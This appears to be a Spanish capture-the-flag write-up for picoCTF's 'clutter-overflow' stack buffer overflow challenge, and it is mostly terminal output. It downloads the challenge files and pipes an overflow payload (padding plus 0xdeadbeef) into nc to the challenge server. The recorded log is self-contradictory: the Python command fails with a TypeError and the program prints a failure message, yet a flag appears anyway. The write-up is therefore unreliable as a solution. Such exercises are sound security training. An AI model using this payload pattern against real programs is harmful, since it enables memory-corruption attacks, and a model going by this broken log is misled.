# clutter-overflow

## Descripción
Clutter, clutter everywhere and not a byte to use. `nc mars.picoctf.net 31890`
## Pistas

## Solución
```bash
┌──(kali㉿kali)-[~/Documents/reversing/clutter]
└─$ wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c
--2023-05-16 20:46:36--  https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall.c
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.160.124.108, 18.160.124.34, 18.160.124.38, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.160.124.108|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2389 (2.3K) [binary/octet-stream]
Saving to: ‘chall.c’

chall.c              100%[===================>]   2.33K  --.-KB/s    in 0s      

2023-05-16 20:46:37 (57.5 MB/s) - ‘chall.c’ saved [2389/2389]

                                                                                 
┌──(kali㉿kali)-[~/Documents/reversing/clutter]
└─$ wget https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall  
--2023-05-16 20:46:49--  https://artifacts.picoctf.net/picoMini+by+redpwn/Binary+Exploitation/clutter-overflow/chall
Resolving artifacts.picoctf.net (artifacts.picoctf.net)... 18.160.124.119, 18.160.124.38, 18.160.124.34, ...
Connecting to artifacts.picoctf.net (artifacts.picoctf.net)|18.160.124.119|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 12704 (12K) [binary/octet-stream]
Saving to: ‘chall’

chall                100%[===================>]  12.41K  --.-KB/s    in 0s      

2023-05-16 20:46:49 (158 MB/s) - ‘chall’ saved [12704/12704]

┌──(kali㉿kali)-[~/Documents/reversing/clutter]
└─$ (python -c "print('A'*264)+'\xef\xbe\xad\xde'") | nc mars.picoctf.net 31890 
Traceback (most recent call last):
  File "<string>", line 1, in <module>
TypeError: unsupported operand type(s) for +: 'NoneType' and 'str'
 ______________________________________________________________________
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |
|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|
| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \^ ^ |
|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \ ^ _ ^ / |                | \^ ^|
| ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | //  | /_\ ^| |   ____  ____   | | ^ |
|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|
| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |
|^ ^ ^ ^ ^| /     (   \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \|^ ^|
.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |
|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\ |^ ^|
| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |
|'.____'_^||/!\@@@@@/!\|| _'______________.'|==                    =====
|\|______|===============|________________|/|""""""""""""""""""""""""""
" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  
""''""""''"""""""""""""""''""""""""""""""''""""""""""""""""""""""""""""""
""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
My room is so cluttered...
What do you see?
code == 0x0
code != 0xdeadbeef :(
picoCTF(c0ntr0ll3d_clutt3r_in_my_buff3r)
                                                                    
┌──(kali㉿kali)-[~/Documents/reversing/clutter]
└─$ 



```
## Bandera
picoCTF(c0ntr0ll3d_clutt3r_in_my_buff3r)

## Notas Adicionales 
comando          descripción

## Referencias